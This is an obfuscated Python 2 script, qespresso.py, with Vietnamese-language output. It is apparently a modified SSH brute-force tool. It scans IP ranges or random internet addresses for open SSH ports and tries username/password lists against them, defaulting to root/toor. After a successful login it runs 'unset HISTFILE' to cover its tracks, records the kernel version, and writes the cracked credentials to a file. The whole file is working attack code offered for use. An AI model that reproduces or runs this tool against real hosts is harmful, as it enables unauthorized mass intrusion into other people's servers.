#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
# qespresso.py - SSH [B]ullshit                                                #
#                                                                              #
# FILE                                                                         #
# qespresso.py                                                                 #
#                                                                              #
# DATE                                                                         #
# 2014-Jun-09                                                                  #
#                                                                              #
# DESCRIPTION                                                                  #
# 'qespresso.py' is a [B]ullshit ssh script for a few dollars more             #
#                                                                              #
# AUTHOR                                                                       #
# [B]ullshit - modifided from ssh brute force open source code                 #
# Thank to pgt - http://www.nullsecurity.net/                                  # 
################################################################################
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import argparse
import random
import re
if 73 - 73: II111iiii
if 22 - 22: I1IiiI * Oo0Ooo / OoO0O00 . OoOoOO00 . o0oOOo0O0Ooo / I1ii11iIi11i
if 48 - 48: oO0o / OOooOOo / I11i / Ii1I
IiiIII111iI = 'v1.0'
if 34 - 34: iii1I1I / O00oOoOoO0o0O . O0oo0OO0 + Oo0ooO0oo0oO . OoO0O00 - I1ii11iIi11i
if 53 - 53: I11i / Oo0Ooo / II111iiii % Ii1I / OoOoOO00 . Oo0ooO0oo0oO
if 100 - 100: i1IIi
def I1Ii11I1Ii1i ( ) :
 print '[B]ullshit ssh - For a few dollars more'
 if 67 - 67: iIii1I11I1II1 . I1ii11iIi11i . oO0o / i1IIi % II111iiii - OoOoOO00
 if 91 - 91: OoO0O00 . i11iIiiIii / oO0o % I11i / OoO0O00 - i11iIiiIii
def II1Iiii1111i ( ) :
 print '[+] qespresso.py %s' % ( IiiIII111iI )
 sys . exit ( 0 )
 if 25 - 25: Ii1I
 if 89 - 89: OoooooooOO - O00oOoOoO0o0O * Oo0ooO0oo0oO
def O0I11i1i11i1I ( filename ) :
 try :
  Iiii = open ( filename , 'a' )
  Iiii . close ( )
 except IOError :
  print '[!] WTF!: cannot write to file \'%s\'' % filename
  sys . exit ( 1 )
  if 87 - 87: oO0o / Oo0ooO0oo0oO + O0oo0OO0 - Oo0ooO0oo0oO . Oo0ooO0oo0oO / II111iiii
  if 11 - 11: I1IiiI % o0oOOo0O0Ooo - Oo0Ooo
def oo0O000OoO ( ) :
 i1iiIIiiI111 = argparse . ArgumentParser (
 usage = '\n\n   ./%(prog)s -i <arg> | -r <arg> | -I <arg>' ,
 formatter_class = argparse . RawDescriptionHelpFormatter ,
 epilog =
 'examples:\n\n'

 '  Lượm một cháu\n'
 '  usage: ./%(prog)s -i Yahoo.com -L passwords.txt\n\n'

 '  Lượm nguyên một(vài) ranges (Scan trước - hốt sau)\n'
 '  usage: ./%(prog)s -i 192.168.0-10.1-254 -u admin -l troll -s 500' ,
 add_help = False
 )
 if 62 - 62: i11iIiiIii - II111iiii
 IIIiI11ii = i1iiIIiiI111 . add_argument_group ( 'options' , '' )
 IIIiI11ii . add_argument ( '-i' , default = False , metavar = '<ip/range>' ,
 help = 'ip address/ip range/domain (e.g.: 192.168.0-3.1-254)' )
 IIIiI11ii . add_argument ( '-I' , default = False , metavar = '<file>' ,
 help = 'list of targets' )
 IIIiI11ii . add_argument ( '-r' , default = False , metavar = '<num>' ,
 help = 'attack random hosts' )
 IIIiI11ii . add_argument ( '-p' , default = 22 , metavar = '<num>' ,
 help = 'port number of sshd (default: 22)' )
 IIIiI11ii . add_argument ( '-t' , default = 4 , metavar = '<num>' ,
 help = 'threads per host (default: 4)' )
 IIIiI11ii . add_argument ( '-f' , default = 8 , metavar = '<num>' ,
 help = 'attack max hosts parallel (default: 8)' )
 IIIiI11ii . add_argument ( '-u' , default = 'root' , metavar = '<username>' ,
 help = 'single username (default: root)' )
 IIIiI11ii . add_argument ( '-U' , default = False , metavar = '<file>' ,
 help = 'list of user|pass (e.g.: support|support)' )
 IIIiI11ii . add_argument ( '-l' , default = 'toor' , metavar = '<password>' ,
 help = 'single password (default: toor)' )
 IIIiI11ii . add_argument ( '-L' , default = False , metavar = '<file>' ,
 help = 'list of passwords' )
 IIIiI11ii . add_argument ( '-o' , default = False , metavar = '<file>' ,
 help = 'write found logins to file' )
 IIIiI11ii . add_argument ( '-O' , default = False , metavar = '<file>' ,
 help = 'write found target ip addresses to file' )
 IIIiI11ii . add_argument ( '-s' , default = 200 , metavar = '<num>' ,
 help = 'threads when port scanning (default: 200)' )
 IIIiI11ii . add_argument ( '-T' , default = 3 , metavar = '<sec>' ,
 help = 'timeout in seconds (default: 3)' )
 IIIiI11ii . add_argument ( '-V' , action = 'store_true' ,
 help = 'print version of qespresso.py and exit' )
 if 52 - 52: iii1I1I + OOooOOo % OoooooooOO / i11iIiiIii
 iiIIi1IiIi11 = i1iiIIiiI111 . parse_args ( )
 if 11 - 11: Oo0ooO0oo0oO / O0 - i1IIi
 if iiIIi1IiIi11 . V :
  II1Iiii1111i ( )
  if 85 - 85: OOooOOo % I1ii11iIi11i * Oo0ooO0oo0oO
 if ( iiIIi1IiIi11 . i == False ) and ( iiIIi1IiIi11 . I == False ) and ( iiIIi1IiIi11 . r == False ) :
  print ''
  i1iiIIiiI111 . print_help ( )
  sys . exit ( 0 )
  if 90 - 90: o0oOOo0O0Ooo % o0oOOo0O0Ooo % I11i * OoOoOO00
 return iiIIi1IiIi11
 if 26 - 26: Ii1I - o0oOOo0O0Ooo
 if 63 - 63: II111iiii . II111iiii
def Ii1 ( filename , text ) :
 Iiii = open ( filename , 'a' )
 Iiii . write ( text )
 Iiii . close ( )
 if 71 - 71: OoO0O00
 if 55 - 55: OoO0O00 / I1ii11iIi11i * OOooOOo
def OoO000 ( target , port , timeout , oips ) :
 IIiiIiI1 = socket ( AF_INET , SOCK_STREAM )
 IIiiIiI1 . settimeout ( timeout )
 iiIiIIi = IIiiIiI1 . connect_ex ( ( target , port ) )
 IIiiIiI1 . close ( )
 if iiIiIIi == 0 :
  ooOoo0O . append ( target )
  if oips :
   Ii1 ( oips , target + '\n' )
   if 76 - 76: O0 / o0oOOo0O0Ooo . I1IiiI * Ii1I - OOooOOo
   if 76 - 76: i11iIiiIii / iIii1I11I1II1 . I1ii11iIi11i % OOooOOo / OoooooooOO % oO0o
def o0ooo00O0o0 ( threads , waittime ) :
 while threading . activeCount ( ) > threads :
  time . sleep ( waittime )
  if 63 - 63: Ii1I
  if 86 - 86: Oo0ooO0oo0oO . I1IiiI % Oo0Ooo + o0oOOo0O0Ooo
def Ii1I11I11i1 ( args , target ) :
 o0o00o0 = int ( args . p )
 iIi1ii1I1 = float ( args . T )
 o0 = args . O
 I11II1i = int ( args . s )
 if 23 - 23: I1ii11iIi11i / o0oOOo0O0Ooo + I11i + I11i / II111iiii
 iiI1 = threading . Thread ( target = OoO000 , args = ( target , o0o00o0 , iIi1ii1I1 , o0 ) )
 iiI1 . start ( )
 if 19 - 19: I11i + Oo0ooO0oo0oO
 o0ooo00O0o0 ( I11II1i , 0.0001 )
 time . sleep ( 0.001 )
 if 53 - 53: OoooooooOO . i1IIi
 if 18 - 18: o0oOOo0O0Ooo
def I1i1I1II ( i ) :
 sys . stdout . flush ( )
 sys . stdout . write ( '\r[*] Đã scan chừng này: {0} | ' 'Có thể lượm: {1}' . format ( i , len ( ooOoo0O ) ) )
 if 45 - 45: O0oo0OO0 . OoOoOO00
 if 83 - 83: oO0o . iIii1I11I1II1 . I1ii11iIi11i
 if 31 - 31: Ii1I . Ii1I - o0oOOo0O0Ooo / OoO0O00 + Oo0ooO0oo0oO * I1IiiI
def O0ooOooooO ( targets ) :
 if re . match ( r'^[0-9.\-]*$' , targets ) :
  return targets
 try :
  o00O = gethostbyname ( targets )
  return o00O
 except gaierror :
  print '[-] \'%s\' is unreachable' % ( targets )
  OOO0OOO00oo ( )
  sys . exit ( 1 )
  if 31 - 31: II111iiii - OOooOOo . O0oo0OO0 % OoOoOO00 - O0
  if 4 - 4: II111iiii / Oo0ooO0oo0oO . iii1I1I
def O0oo0OO0oOOOo ( ) :
 print '[*] unsort host list'
 for i1i1i11IIi in range ( 15 ) :
  random . shuffle ( ooOoo0O )
  if 33 - 33: o0oOOo0O0Ooo + OOooOOo * OoO0O00 - Oo0Ooo / oO0o % Ii1I
  if 21 - 21: OoO0O00 * iIii1I11I1II1 % oO0o * i1IIi
def Ii11Ii1I ( iprange ) :
 O00oO = tuple ( part for part in iprange . split ( '.' ) )
 if 39 - 39: O00oOoOoO0o0O - II111iiii * OoO0O00 % o0oOOo0O0Ooo * II111iiii % II111iiii
 OoOOOOO = range ( 4 )
 iIi1i111II = range ( 4 )
 for i1i1i11IIi in range ( 4 ) :
  OoOO00O = O00oO [ i1i1i11IIi ] . find ( '-' )
  if OoOO00O != - 1 :
   OoOOOOO [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] [ : OoOO00O ] )
   iIi1i111II [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] [ 1 + OoOO00O : ] ) + 1
  else :
   OoOOOOO [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] )
   iIi1i111II [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] ) + 1
   if 53 - 53: OoO0O00 % OoooooooOO - OoOoOO00
 return ( OoOOOOO , iIi1i111II )
 if 97 - 97: oO0o % O00oOoOoO0o0O * O00oOoOoO0o0O
 if 39 - 39: Ii1I % O00oOoOoO0o0O
def i111IiI1I ( args ) :
 O0iII = O0ooOooooO ( args . i )
 OoOOOOO , iIi1i111II = Ii11Ii1I ( O0iII )
 if 80 - 80: O00oOoOoO0o0O . oO0o
 print '[*] Đang scan %s' % O0iII
 IIi = 0
 for i1i1i11IIi in range ( OoOOOOO [ 0 ] , iIi1i111II [ 0 ] ) :
  for i11iIIIIIi1 in range ( OoOOOOO [ 1 ] , iIi1i111II [ 1 ] ) :
   for iiII1i1 in range ( OoOOOOO [ 2 ] , iIi1i111II [ 2 ] ) :
    for o00oOO0o in range ( OoOOOOO [ 3 ] , iIi1i111II [ 3 ] ) :
     o00O = '%d.%d.%d.%d' % ( i1i1i11IIi , i11iIIIIIi1 , iiII1i1 , o00oOO0o )
     IIi += 1
     I1i1I1II ( IIi )
     Ii1I11I11i1 ( args , o00O )
     if 80 - 80: oO0o + OOooOOo - OOooOOo % iii1I1I
     if 63 - 63: I1IiiI - I1ii11iIi11i + O0 % I11i / iIii1I11I1II1 / o0oOOo0O0Ooo
 o0ooo00O0o0 ( 1 , 0.1 )
 if 98 - 98: iii1I1I * iii1I1I / iii1I1I + I11i
 I1i1I1II ( IIi )
 print '\n[*] Đã scan xong!'
 if 34 - 34: Oo0ooO0oo0oO
 if 15 - 15: I11i * Oo0ooO0oo0oO * Oo0Ooo % i11iIiiIii % OoOoOO00 - OOooOOo
def O0ooo0O0oo0 ( ) :
 oo0oOo = range ( 4 )
 for i1i1i11IIi in range ( 4 ) :
  oo0oOo [ i1i1i11IIi ] = random . randrange ( 0 , 256 )
  if 89 - 89: OoOoOO00
  if 68 - 68: OoO0O00 * OoooooooOO % O0 + OoO0O00 + Oo0ooO0oo0oO
 if oo0oOo [ 0 ] == 127 :
  O0ooo0O0oo0 ( )
  if 4 - 4: Oo0ooO0oo0oO + O0 * OOooOOo
 OOoo0O = '%d.%d.%d.%d' % ( oo0oOo [ 0 ] , oo0oOo [ 1 ] , oo0oOo [ 2 ] , oo0oOo [ 3 ] )
 return OOoo0O
 if 67 - 67: i11iIiiIii - i1IIi % I1ii11iIi11i . O0
 if 77 - 77: O00oOoOoO0o0O / I1IiiI
def I1 ( args ) :
 i1i1i11IIi = 0
 print '[*] Scan random, ngắm trâu trúng bò'
 while len ( ooOoo0O ) < int ( args . r ) :
  i1i1i11IIi += 1
  I1i1I1II ( i1i1i11IIi )
  Ii1I11I11i1 ( args , O0ooo0O0oo0 ( ) )
  if 15 - 15: II111iiii
  if 18 - 18: i11iIiiIii . i1IIi % OoooooooOO / O0
 o0ooo00O0o0 ( 1 , 1 )
 if 75 - 75: OoOoOO00 % o0oOOo0O0Ooo % o0oOOo0O0Ooo . O0oo0OO0
 I1i1I1II ( i1i1i11IIi )
 print '\n[*] Đã scan xong!'
 if 5 - 5: o0oOOo0O0Ooo * Oo0ooO0oo0oO + OoOoOO00 . OOooOOo + OoOoOO00
 if 91 - 91: O0
def oOOo0 ( filename ) :
 try :
  open ( filename ) . readlines ( )
 except IOError :
  print '[!] WTF: cannot open file \'%s\'' % filename
  sys . exit ( 1 )
  if 54 - 54: O0 - O00oOoOoO0o0O % OOooOOo
  if 77 - 77: OoOoOO00 / I1IiiI / OoO0O00 + OoO0O00 . OOooOOo
def ii1ii11IIIiiI ( ipfile ) :
 oOOo0 ( ipfile )
 O0iII = open ( ipfile ) . readlines ( )
 for o00O in O0iII :
  ooOoo0O . append ( o00O )
  if 67 - 67: I11i * oO0o * I1ii11iIi11i + OOooOOo / i1IIi
  if 11 - 11: Ii1I + iii1I1I - Oo0ooO0oo0oO * oO0o % i11iIiiIii - O0oo0OO0
def o0oO ( target , port , user , passwd , outfile , timeo , i ) :
 IIiIi1iI = paramiko . SSHClient ( )
 IIiIi1iI . set_missing_host_key_policy ( paramiko . AutoAddPolicy ( ) )
 user = user . replace ( '\n' , '' )
 passwd = passwd . replace ( '\n' , '' )
 try :
  IIiIi1iI . connect ( target , port = port , username = user , password = passwd ,
 timeout = timeo , pkey = None , allow_agent = False )
  time . sleep ( 3 )
  try :
   IIiIi1iI . exec_command ( 'unset HISTFILE ; unset HISTSIZE' )
   time . sleep ( 1 )
   i1IiiiI1iI , i1iIi , ooOOoooooo = IIiIi1iI . exec_command ( 'uname -mrs' )
   if 1 - 1: Oo0Ooo / o0oOOo0O0Ooo % iii1I1I * O00oOoOoO0o0O . i11iIiiIii
   IIiIi1iI . exec_command . join ( 5 )
   if IIiIi1iI . exec_command . is_active ( ) :
    IIiIi1iI . exec_command . terminate ( )
    if 2 - 2: I1ii11iIi11i * I11i - iIii1I11I1II1 + I1IiiI . oO0o % iii1I1I
   ooOOOoOooOoO = 'Ngon! %s' % ( i1iIi . readlines ( ) [ 0 ] . replace ( '\n' , '' ) )
   if 91 - 91: iii1I1I % i1IIi % iIii1I11I1II1
  except :
   ooOOOoOooOoO = 'Hên xui! maybe a honeypot or false positive'
  IIi1I11I1II = '%s|%s|%s' '|%s' % ( target , user , passwd , ooOOOoOooOoO )
  if 63 - 63: OoooooooOO - OoO0O00 . II111iiii / o0oOOo0O0Ooo . OoOoOO00 / O0
  print IIi1I11I1II
  if outfile :
   Ii1 ( outfile , IIi1I11I1II + '\n' )
  IIiIi1iI . close ( )
  os . _exit ( 0 )
 except paramiko . AuthenticationException , o0OOOO00O0Oo :
  IIiIi1iI . close ( )
  ii = str ( o0OOOO00O0Oo )
  if '[\'publickey\']' in ii :
   print '[-] key authentication only - ' 'Không lượm được cháu %s' % ( target )
   if 90 - 90: o0oOOo0O0Ooo % i1IIi / OoO0O00
   os . _exit ( 1 )
  elif '\'keyboard-interactive\'' in ii :
   print '[-] %s requires \'keyboard-interactive\' handler' % ( target )
   os . _exit ( 1 )
 except :
  IIiIi1iI . close ( )
  if 44 - 44: Oo0Ooo . OoO0O00 / I1ii11iIi11i + Ii1I
  if i < 3 :
   i += 1
   if 65 - 65: O0
   oO00OOoO00 = random . uniform ( 0.6 , 1.2 )
   time . sleep ( oO00OOoO00 )
   o0oO ( target , port , user , passwd , outfile , timeo , i )
  else :
   print '[-] too many timeouts - giải tán ! %s' % ( target )
   os . _exit ( 1 )
   if 40 - 40: I1IiiI * Ii1I + OOooOOo % iii1I1I
   if 74 - 74: oO0o - Oo0Ooo + OoooooooOO + O0oo0OO0 / OoOoOO00
def i1 ( target , args ) :
 o0o00o0 = int ( args . p )
 I1iI1iIi111i = args . u
 iiIi1IIi1I = args . U
 o0OoOO000ooO0 = args . l
 o0o0o0oO0oOO = args . L
 Iiii = args . o
 iIi1ii1I1 = float ( args . T )
 I11II1i = int ( args . t )
 if 3 - 3: o0oOOo0O0Ooo
 if iiIi1IIi1I :
  Ii11I1 = open ( iiIi1IIi1I ) . readlines ( )
 else :
  Ii11I1 = [ I1iI1iIi111i ]
 if o0o0o0oO0oOO :
  i1i1Iiii1I1 = open ( o0o0o0oO0oOO ) . readlines ( )
 else :
  i1i1Iiii1I1 = [ o0OoOO000ooO0 ]
  if 53 - 53: II111iiii
  if 31 - 31: OoO0O00
 try :
  for I1iI1iIi111i in Ii11I1 :
   if 80 - 80: O0oo0OO0 . i11iIiiIii - o0oOOo0O0Ooo
   iIiIIi1 , I1IIII1i = I1iI1iIi111i . split ( "|" )
   I1I11i = threading . Thread ( target = o0oO , args = ( target , o0o00o0 , iIiIIi1 ,
 I1IIII1i , Iiii , iIi1ii1I1 , 0 , ) )
   I1I11i . start ( )
   if 5 - 5: OoooooooOO % OoOoOO00 % oO0o % iii1I1I
   o0ooo00O0o0 ( I11II1i , 0.01 )
   time . sleep ( 0.1 )
   if 7 - 7: II111iiii + OoooooooOO . O0oo0OO0 . Oo0ooO0oo0oO - o0oOOo0O0Ooo
  o0ooo00O0o0 ( 1 , 1 )
 except KeyboardInterrupt :
  os . _exit ( 1 )
  if 26 - 26: Oo0Ooo / O00oOoOoO0o0O % iIii1I11I1II1 / O00oOoOoO0o0O + I11i
  if 90 - 90: OoOoOO00 * O0oo0OO0 + o0oOOo0O0Ooo
def OO ( args ) :
 I11II1i = int ( args . t )
 OoOoO = int ( args . f )
 Ii1I1i = len ( ooOoo0O )
 if 99 - 99: oO0o . iii1I1I + Oo0ooO0oo0oO % oO0o . i11iIiiIii % O0
 print '[*] Sẽ lượm %d cháu\n' '[*] Rất máu với %d hosts parallel\n' '[*] Số threads mỗi host: %d' % ( Ii1I1i , OoOoO , I11II1i )
 if 78 - 78: I1ii11iIi11i + OOooOOo - O0oo0OO0
 if 38 - 38: o0oOOo0O0Ooo - oO0o + iIii1I11I1II1 / OoOoOO00 % Oo0Ooo
 if 57 - 57: OoO0O00 / Oo0ooO0oo0oO
 i1i1i11IIi = 1
 for Ii1I1Ii in ooOoo0O :
  Ii1I1Ii = Ii1I1Ii . replace ( '\n' , '' )
  print '[*] Đang lượm %s [%d/%d]' % ( Ii1I1Ii , i1i1i11IIi , Ii1I1i )
  OOoO0 = multiprocessing . Process ( target = i1 , args = ( Ii1I1Ii , args ) )
  OOoO0 . start ( )
  if 86 - 86: oO0o * o0oOOo0O0Ooo % i1IIi . Ii1I . i11iIiiIii
  while len ( multiprocessing . active_children ( ) ) >= OoOoO :
   time . sleep ( 0.001 )
  time . sleep ( 0.001 )
  i1i1i11IIi += 1
  if 56 - 56: I1ii11iIi11i % O0 - I1IiiI
  if 100 - 100: Ii1I - O0 % oO0o * OOooOOo + I1IiiI
 while multiprocessing . active_children ( ) :
  time . sleep ( 1 )
  if 88 - 88: OoooooooOO - OoO0O00 * O0 * OoooooooOO . OoooooooOO
  if 33 - 33: O0oo0OO0 + iii1I1I * oO0o / iIii1I11I1II1 - I1IiiI
def O0oO ( ) :
 if len ( ooOoo0O ) == 0 :
  print '[-] Wew không có cháu nào!'
  OOO0OOO00oo ( )
  sys . exit ( 1 )
  if 73 - 73: I1ii11iIi11i * i11iIiiIii % oO0o . I1ii11iIi11i
  if 66 - 66: oO0o + oO0o + Oo0ooO0oo0oO / iii1I1I + OOooOOo
def OOO0OOO00oo ( ) :
 print '[*] Hết phim!'
 if 30 - 30: O0
def iIi1 ( ) :
 I1Ii11I1Ii1i ( )
 iiIIi1IiIi11 = oo0O000OoO ( )
 if 74 - 74: iIii1I11I1II1 * I1ii11iIi11i + OoOoOO00 / i1IIi / II111iiii . Oo0Ooo
 if iiIIi1IiIi11 . U :
  oOOo0 ( iiIIi1IiIi11 . U )
 if iiIIi1IiIi11 . L :
  oOOo0 ( iiIIi1IiIi11 . L )
 if iiIIi1IiIi11 . o :
  O0I11i1i11i1I ( iiIIi1IiIi11 . o )
 if iiIIi1IiIi11 . O :
  O0I11i1i11i1I ( iiIIi1IiIi11 . O )
  if 62 - 62: OoooooooOO * I1IiiI
 if iiIIi1IiIi11 . i :
  i111IiI1I ( iiIIi1IiIi11 )
  O0oo0OO0oOOOo ( )
 elif iiIIi1IiIi11 . I :
  ii1ii11IIIiiI ( iiIIi1IiIi11 . I )
 else :
  I1 ( iiIIi1IiIi11 )
  if 58 - 58: OoOoOO00 % o0oOOo0O0Ooo
 time . sleep ( 0.1 )
 O0oO ( )
 OO ( iiIIi1IiIi11 )
 OOO0OOO00oo ( )
 if 50 - 50: O0oo0OO0 . o0oOOo0O0Ooo
if __name__ == '__main__' :
 ooOoo0O = [ ]
 try :
  logging . disable ( logging . CRITICAL )
  iIi1 ( )
 except KeyboardInterrupt :
  print '\nÁ đù Ctrl+C à!'
  time . sleep ( 0.2 )
  os . _exit ( 1 )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
